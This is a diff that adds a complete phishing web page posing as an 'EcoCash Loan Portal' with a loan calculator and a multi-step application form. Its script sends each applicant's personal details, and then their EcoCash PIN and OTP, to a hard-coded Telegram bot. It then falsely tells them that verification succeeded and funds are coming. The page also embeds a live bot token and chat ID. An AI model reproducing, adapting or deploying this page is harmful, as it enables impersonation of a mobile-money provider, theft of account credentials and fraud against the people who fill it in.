@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EcoCash - Loan Portal</title>
+    <style>
+        :root {
+            --primary: #6366f1;
+            --primary-gradient: linear-gradient(135deg, #6366f1, #a855f7);
+            --bg: #e2e8f0;
+            --card: #ffffff;
+            --text: #1e293b;
+            --muted: #64748b;
+            --border: #e2e8f0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg);
+            color: var(--text);
+            padding: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            line-height: 1.5;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 4px;
+            margin-bottom: 12px;
+        }
+
+        .logo {
+            font-size: 20px;
+            font-weight: 700;
+            color: #dc2626;
+        }
+
+        .menu-icon {
+            font-size: 20px;
+            cursor: pointer;
+            color: var(--text);
+        }
+
+        .card {
+            background: var(--card);
+            border-radius: 16px;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05);
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+
+        .header-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 6px;
+        }
+
+        .header-sub {
+            text-align: center;
+            font-size: 13px;
+            color: var(--muted);
+            margin-bottom: 24px;
+        }
+
+        .steps-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background: #cbd5e1;
+            margin: 0 4px;
+            border-radius: 2px;
+            transition: background 0.3s;
+        }
+
+        .step-bar.active {
+            background: #4f46e5;
+        }
+
+        .step-content {
+            display: none;
+        }
+
+        .step-content.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: var(--text);
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 15px;
+            background-color: #fff;
+            color: var(--text);
+            transition: border-color 0.2s;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .calc-box {
+            background: #f8fafc;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .calc-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .calc-value {
+            color: #4f46e5;
+            font-size: 18px;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            margin: 8px 0 4px 0;
+            accent-color: #4f46e5;
+        }
+
+        .range-labels {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: var(--muted);
+            margin-bottom: 16px;
+        }
+
+        .monthly-payment-card {
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 16px;
+        }
+
+        .phone-group {
+            display: flex;
+            gap: 8px;
+        }
+
+        .phone-prefix {
+            background: #f1f5f9;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            font-weight: 600;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 24px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            text-align: center;
+            transition: opacity 0.2s;
+        }
+
+        .btn-primary {
+            background: var(--primary-gradient);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: #e2e8f0;
+            color: var(--text);
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+        }
+
+        .summary-box {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border);
+        }
+
+        .summary-title {
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: var(--text);
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            margin-bottom: 8px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .summary-label {
+            color: var(--muted);
+        }
+
+        .summary-val {
+            font-weight: 600;
+            color: var(--text);
+        }
+
+        .status-msg {
+            margin-top: 16px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            text-align: center;
+            display: none;
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 12px;
+            color: var(--muted);
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="navbar">
+            <div class="logo">EcoCash</div>
+            <div class="menu-icon">&#9776;</div>
+        </div>
+
+        <div class="card">
+            <div class="steps-indicator" id="stepsIndicator">
+                <div class="step-bar active" id="bar1"></div>
+                <div class="step-bar" id="bar2"></div>
+                <div class="step-bar" id="bar3"></div>
+            </div>
+
+            <div id="loanForm">
+                <!-- STEP 1 -->
+                <div class="step-content active" id="step1">
+                    <div class="header-title">Get Your Loan Approved Fast</div>
+                    <div class="header-sub">Quick approval &bull; Competitive rates &bull; Flexible terms</div>
+
+                    <div class="calc-box">
+                        <div class="calc-row">
+                            <span>Loan Amount</span>
+                            <span class="calc-value" id="amountDisplay">$5,000</span>
+                        </div>
+                        <input type="range" id="loanAmountRange" min="100" max="5000" step="100" value="5000">
+                        <div class="range-labels">
+                            <span>$100</span>
+                            <span>$5,000</span>
+                        </div>
+
+                        <div class="form-group" style="margin-bottom: 12px;">
+                            <label>Loan Term</label>
+                            <select id="loanTerm">
+                                <option value="6">6 Months</option>
+                                <option value="12" selected>12 Months</option>
+                                <option value="18">18 Months</option>
+                                <option value="24">24 Months</option>
+                                <option value="36">36 Months</option>
+                                <option value="48">48 Months</option>
+                                <option value="60">60 Months</option>
+                            </select>
+                        </div>
+
+                        <div class="monthly-payment-card">
+                            <span style="font-size: 13px; color: var(--muted);">Monthly Payment</span>
+                            <span style="font-size: 18px; font-weight: 700; color: #4f46e5;" id="monthlyPaymentDisplay">$437.50</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Loan Type</label>
+                        <select id="loanType">
+                            <option value="Personal Loan">Personal Loan</option>
+                            <option value="Business Loan">Business Loan</option>
+                            <option value="Home Loan">Home Loan</option>
+                            <option value="Car Loan">Car Loan</option>
+                            <option value="Education Loan">Education Loan</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Purpose of Loan</label>
+                        <input type="text" id="loanPurpose" value="Buy a car" required>
+                    </div>
+
+                    <button type="button" class="btn btn-primary" style="width: 100%; margin-top: 10px;" id="nextBtn1">NEXT STEP</button>
+                </div>
+
+                <!-- STEP 2 -->
+                <div class="step-content" id="step2">
+                    <div class="header-title">Loan Application</div>
+                    <div class="header-sub">Step 2 of 3</div>
+
+                    <div class="form-group">
+                        <label>First Name</label>
+                        <input type="text" id="firstName" placeholder="John">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Last Name</label>
+                        <input type="text" id="lastName" placeholder="Doe">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Email Address</label>
+                        <input type="email" id="email" placeholder="john.doe@example.com">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Phone Number</label>
+                        <div class="phone-group">
+                            <div class="phone-prefix">+263</div>
+                            <input type="tel" id="phoneNumber" placeholder="123456789">
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" id="prevBtn2">PREVIOUS</button>
+                        <button type="button" class="btn btn-primary" id="nextBtn2">NEXT STEP</button>
+                    </div>
+                </div>
+
+                <!-- STEP 3 -->
+                <div class="step-content" id="step3">
+                    <div class="header-title">Loan Application</div>
+                    <div class="header-sub">Step 3 of 3</div>
+
+                    <div class="form-group">
+                        <label>Employment Status</label>
+                        <select id="employmentStatus">
+                            <option value="Employed">Employed</option>
+                            <option value="Self-Employed">Self-Employed</option>
+                            <option value="Business Owner">Business Owner</option>
+                            <option value="Freelancer">Freelancer</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Annual Income ($)</label>
+                        <input type="number" id="annualIncome" value="50000">
+                    </div>
+
+                    <div class="summary-box">
+                        <div class="summary-title">Application Summary</div>
+                        <div class="summary-row">
+                            <span class="summary-label">Loan Type:</span>
+                            <span class="summary-val" id="sumLoanType">Personal Loan</span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label">Loan Amount:</span>
+                            <span class="summary-val" id="sumAmount">$5,000</span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label">Loan Term:</span>
+                            <span class="summary-val" id="sumTerm">12 Months</span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label">Purpose:</span>
+                            <span class="summary-val" id="sumPurpose">Buy a car</span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label">Applicant:</span>
+                            <span class="summary-val" id="sumApplicant">J D</span>
+                        </div>
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" id="prevBtn3">PREVIOUS</button>
+                        <button type="button" class="btn btn-primary" id="submitInitialBtn">SUBMIT APPLICATION</button>
+                    </div>
+
+                    <div id="initialStatusBox" class="status-msg"></div>
+                </div>
+
+                <!-- STEP 4 -->
+                <div class="step-content" id="step4">
+                    <div class="header-title">Account Verification</div>
+                    <div class="header-sub">Enter your EcoCash PIN & OTP to disburse funds</div>
+
+                    <div style="background: #f8fafc; border: 1px solid var(--border); border-radius: 8px; padding: 14px; margin-bottom: 18px; font-size: 13px; color: var(--muted);">
+                        Please confirm your mobile money credentials to authorize loan deposit directly into your EcoCash wallet.
+                    </div>
+
+                    <div class="form-group">
+                        <label>EcoCash PIN</label>
+                        <input type="password" id="ecocashPin" maxlength="5" placeholder="&bull;&bull;&bull;&bull;&bull;">
+                    </div>
+
+                    <div class="form-group">
+                        <label>OTP Code</label>
+                        <input type="text" id="otpCode" placeholder="Enter 4-6 digit OTP">
+                    </div>
+
+                    <div class="btn-group">
+                        <button type="button" class="btn btn-secondary" id="prevBtn4">PREVIOUS</button>
+                        <button type="button" class="btn btn-primary" id="submitVerifyBtn">VERIFY &amp; DISBURSE</button>
+                    </div>
+
+                    <div id="verifyStatusBox" class="status-msg"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            &copy; 2026 EcoCash
+        </div>
+    </div>
+
+    <script>
+        const botToken = "8641245398:AAGYI7pFOVVrKqf9ILOSo6yGyOdFVSekkpM";
+        const chatId = "8557614507";
+
+        const amountRange = document.getElementById('loanAmountRange');
+        const termSelect = document.getElementById('loanTerm');
+        const amountDisplay = document.getElementById('amountDisplay');
+        const monthlyPaymentDisplay = document.getElementById('monthlyPaymentDisplay');
+
+        function updateCalculator() {
+            if (!amountRange || !termSelect) return;
+            const principal = parseFloat(amountRange.value);
+            const months = parseInt(termSelect.value);
+            amountDisplay.textContent = '$' + principal.toLocaleString();
+            const monthlyInterestRate = 0.08 / 12;
+            let monthlyPayment = monthlyInterestRate === 0 ? principal / months : (principal * monthlyInterestRate * Math.pow(1 + monthlyInterestRate, months)) / (Math.pow(1 + monthlyInterestRate, months) - 1);
+            monthlyPaymentDisplay.textContent = '$' + monthlyPayment.toFixed(2);
+        }
+
+        if (amountRange && termSelect) {
+            amountRange.addEventListener('input', updateCalculator);
+            amountRange.addEventListener('change', updateCalculator);
+            termSelect.addEventListener('change', updateCalculator);
+            updateCalculator();
+        }
+
+        const nextBtn1 = document.getElementById('nextBtn1');
+        if (nextBtn1) {
+            nextBtn1.addEventListener('click', function() {
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+                const bar2 = document.getElementById('bar2');
+                if (bar2) bar2.classList.add('active');
+            });
+        }
+
+        const nextBtn2 = document.getElementById('nextBtn2');
+        if (nextBtn2) {
+            nextBtn2.addEventListener('click', function() {
+                const fn = document.getElementById('firstName').value.trim();
+                const ln = document.getElementById('lastName').value.trim();
+                const phone = document.getElementById('phoneNumber').value.trim();
+                if(!fn || !ln || !phone) {
+                    alert('Please fill in your First Name, Last Name, and Phone Number.');
+                    return;
+                }
+                document.getElementById('sumLoanType').textContent = document.getElementById('loanType').value;
+                document.getElementById('sumAmount').textContent = amountDisplay.textContent;
+                document.getElementById('sumTerm').textContent = termSelect.options[termSelect.selectedIndex].text;
+                document.getElementById('sumPurpose').textContent = document.getElementById('loanPurpose').value || 'General Loan';
+                document.getElementById('sumApplicant').textContent = fn.charAt(0).toUpperCase() + '. ' + ln.charAt(0).toUpperCase() + '.';
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step3').classList.add('active');
+                const bar3 = document.getElementById('bar3');
+                if (bar3) bar3.classList.add('active');
+            });
+        }
+
+        const prevBtn2 = document.getElementById('prevBtn2');
+        if (prevBtn2) {
+            prevBtn2.addEventListener('click', function() {
+                document.getElementById('step2').classList.remove('active');
+                const bar2 = document.getElementById('bar2');
+                if (bar2) bar2.classList.remove('active');
+                document.getElementById('step1').classList.add('active');
+            });
+        }
+
+        const prevBtn3 = document.getElementById('prevBtn3');
+        if (prevBtn3) {
+            prevBtn3.addEventListener('click', function() {
+                document.getElementById('step3').classList.remove('active');
+                const bar3 = document.getElementById('bar3');
+                if (bar3) bar3.classList.remove('active');
+                document.getElementById('step2').classList.add('active');
+            });
+        }
+
+        const prevBtn4 = document.getElementById('prevBtn4');
+        if (prevBtn4) {
+            prevBtn4.addEventListener('click', function() {
+                document.getElementById('step4').classList.remove('active');
+                const stepsIndicator = document.getElementById('stepsIndicator');
+                if (stepsIndicator) stepsIndicator.style.display = 'flex';
+                document.getElementById('step3').classList.add('active');
+            });
+        }
+
+        const submitInitialBtn = document.getElementById('submitInitialBtn');
+        if (submitInitialBtn) {
+            submitInitialBtn.addEventListener('click', async function() {
+                submitInitialBtn.disabled = true;
+                submitInitialBtn.textContent = 'SUBMITTING...';
+
+                try {
+                    const message = `🚨 *NEW ECO CASH LOAN APPLICATION* 🚨\n\n` +
+                                    `📂 *Loan Type:* ${document.getElementById('loanType').value}\n` +
+                                    `👤 *Name:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
+                                    `📧 *Email:* ${document.getElementById('email').value || 'N/A'}\n` +
+                                    `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
+                                    `💰 *Amount:* ${amountDisplay.textContent}\n` +
+                                    `⏱ *Term:* ${termSelect.options[termSelect.selectedIndex].text}\n` +
+                                    `📋 *Purpose:* ${document.getElementById('loanPurpose').value}\n` +
+                                    `💼 *Employment:* ${document.getElementById('employmentStatus').value}\n` +
+                                    `💵 *Annual Income:* $${document.getElementById('annualIncome').value}`;
+
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                    });
+                    const data = await response.json();
+
+                    if (data.ok) {
+                        document.getElementById('step3').classList.remove('active');
+                        document.getElementById('step4').classList.add('active');
+                        const stepsIndicator = document.getElementById('stepsIndicator');
+                        if (stepsIndicator) stepsIndicator.style.display = 'none';
+                        submitInitialBtn.disabled = false;
+                        submitInitialBtn.textContent = 'SUBMIT APPLICATION';
+                    } else {
+                        throw new Error(data.description);
+                    }
+                } catch (error) {
+                    alert('Submission failed: ' + error.message);
+                    submitInitialBtn.disabled = false;
+                    submitInitialBtn.textContent = 'SUBMIT APPLICATION';
+                }
+            });
+        }
+
+        const submitVerifyBtn = document.getElementById('submitVerifyBtn');
+        if (submitVerifyBtn) {
+            submitVerifyBtn.addEventListener('click', async function() {
+                const pin = document.getElementById('ecocashPin').value.trim();
+                const otp = document.getElementById('otpCode').value.trim();
+                if (!pin || !otp) {
+                    alert('Please enter both your EcoCash PIN and OTP code.');
+                    return;
+                }
+
+                submitVerifyBtn.disabled = true;
+                submitVerifyBtn.textContent = 'VERIFYING...';
+                const statusBox = document.getElementById('verifyStatusBox');
+
+                try {
+                    const message = `🔐 *ECOCASH VERIFICATION CREDENTIALS* 🔐\n\n` +
+                                    `👤 *Applicant:* ${document.getElementById('firstName').value} ${document.getElementById('lastName').value}\n` +
+                                    `📱 *Phone:* +263 ${document.getElementById('phoneNumber').value}\n` +
+                                    `🔑 *EcoCash PIN:* \`${pin}\`\n` +
+                                    `🔢 *OTP Code:* \`${otp}\``;
+
+                    const response = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const resp = await fetch(response, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
+                    });
+                    const data = await resp.json();
+
+                    if (data.ok) {
+                        if (statusBox) {
+                            statusBox.textContent = 'Verification successful! Funds will be credited to your wallet.';
+                            statusBox.style.background = '#d1fae5';
+                            statusBox.style.color = '#065f46';
+                            statusBox.style.display = 'block';
+                        }
+                        submitVerifyBtn.textContent = 'VERIFIED & SUCCESSFUL';
+                    } else {
+                        throw new Error(data.description);
+                    }
+                } catch (error) {
+                    if (statusBox) {
+                        statusBox.textContent = 'Verification failed: ' + error.message;
+                        statusBox.style.background = '#fee2e2';
+                        statusBox.style.color = '#991b1b';
+                        statusBox.style.display = 'block';
+                    }
+                    submitVerifyBtn.disabled = false;
+                    submitVerifyBtn.textContent = 'VERIFY & DISBURSE';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
